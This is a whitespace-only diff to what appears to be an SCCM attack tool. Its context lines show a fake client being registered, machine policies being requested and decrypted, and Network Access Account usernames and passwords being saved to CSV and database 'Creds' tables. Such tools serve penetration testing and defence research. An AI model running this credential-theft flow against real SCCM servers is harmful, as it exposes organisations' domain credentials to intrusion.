@@ -54,7 +54,7 @@ class Tools:
   def write_to_file(input, file):
     with open(file, "w", encoding='utf-8') as fd:
       fd.write(input)
-  
+
   @staticmethod
   def write_to_csv(input, logs_dir):
       fields = ["username", "password"]
@@ -172,7 +172,7 @@ class SCCMTools():
                 else:
                     pass
 
-            
+
     def sendCCMPostRequestWithOutAuth(self, data, headers):
         r = requests.request("CCM_POST", f"{self._serverURI}/ccm_system/request", headers=headers, data=data)
         #check if the response actually has a body, if not sleep and try again
@@ -194,7 +194,7 @@ class SCCMTools():
                     except Exception as e:
                         print(e)
 
-    
+
 
     def requestPolicy(self, url, clientID="", authHeaders=False, retcontent=False, key=""):
         headers = {
@@ -204,7 +204,7 @@ class SCCMTools():
 
         if authHeaders == True:
           headers["ClientToken"] = "GUID:{};{};2".format(
-            clientID, 
+            clientID,
             now.strftime(dateFormat1)
           )
           #for manual retrieval
@@ -226,8 +226,8 @@ class SCCMTools():
             #with open("/tmp/key.pem", "wb") as f:
             with open(f"{os.getcwd()}/key.pem", "wb") as f:
                 f.write(self.key.private_bytes(
-                    encoding=serialization.Encoding.PEM, 
-                    format=serialization.PrivateFormat.TraditionalOpenSSL, 
+                    encoding=serialization.Encoding.PEM,
+                    format=serialization.PrivateFormat.TraditionalOpenSSL,
                     encryption_algorithm=serialization.BestAvailableEncryption(b"mimikatz"),
                 ))
 
@@ -238,10 +238,10 @@ class SCCMTools():
         b = self.cert.public_bytes(serialization.Encoding.DER).hex().upper()
 
         embedded = registrationRequest.format(
-          date=now.strftime(dateFormat1), 
-          encryption=b, 
-          signature=b, 
-          client=name, 
+          date=now.strftime(dateFormat1),
+          encryption=b,
+          signature=b,
+          client=name,
           clientfqdn=fqname
         )
 
@@ -249,9 +249,9 @@ class SCCMTools():
         request = Tools.encode_unicode(registrationRequestWrapper.format(data=embedded, signature=signature)) + "\r\n".encode('ascii')
 
         header = msgHeader.format(
-          bodylength=len(request)-2, 
-          client=name, 
-          date=now.strftime(dateFormat1), 
+          bodylength=len(request)-2,
+          client=name,
+          date=now.strftime(dateFormat1),
           sccmserver=self._server
         )
 
@@ -275,13 +275,13 @@ class SCCMTools():
         payloadSignature = CryptoTools.sign(self.key, bodyCompressed).hex().upper()
 
         header = msgHeaderPolicy.format(
-          bodylength=len(body)-2, 
-          sccmserver=self._server, 
-          client=name, 
-          publickey=public_key, 
-          clientIDsignature=clientIDSignature, 
-          payloadsignature=payloadSignature, 
-          clientid=uuid, 
+          bodylength=len(body)-2,
+          sccmserver=self._server,
+          client=name,
+          publickey=public_key,
+          clientIDsignature=clientIDSignature,
+          payloadsignature=payloadSignature,
+          clientid=uuid,
           date=now.strftime(dateFormat1)
         )
 
@@ -305,7 +305,7 @@ class SCCMTools():
         decrypted = CryptoTools.decrypt3Des(self.key, encryptedRSAKey, iv, body)
         policy = decrypted.decode('utf-16')
         return policy
-    
+
     def rename_key(self, uuid):
        key = f"{os.getcwd()}/key.pem"
                # with open (f"{self.logs_dir}/{self.uuid}.pem", "rb") as g:
@@ -383,7 +383,7 @@ class SCCMTools():
         except Exception as e:
             print(e)
         # cursor.execute(f'''insert into SiteServers (Hostname, SiteCode, SigningStatus, SiteServer, Active, Passive, MSSQL) values (?,?,?,?,?,?,?)''',
-        #                 (result, '', '', 'True', '', '', '')) 
+        #                 (result, '', '', 'True', '', '', ''))
 
     def write_to_db(self, username, password):
         source = "HTTP NAA"
@@ -397,14 +397,14 @@ class SCCMTools():
             cursor.execute(f'''insert into Creds (Username, Password, Source) values (?,?,?)''', (username, password, source))
             conn.commit()
         return
-    
-    
+
+
     def sccmwtf_run(self):
 
         logger.debug("[*] Creating certificate for our fake server...")
 
         self.createCertificate(True)
-        
+
         logger.debug("[*] Registering our fake server...")
         uuid = self.sendRegistration(self._target_name, self._target_fqdn, self.target_username, self.target_password)
 
@@ -437,6 +437,6 @@ class SCCMTools():
                 except:
                     logger.info(f"[-] Something went wrong.")
         return False
-                
-        
- 
+
+
+
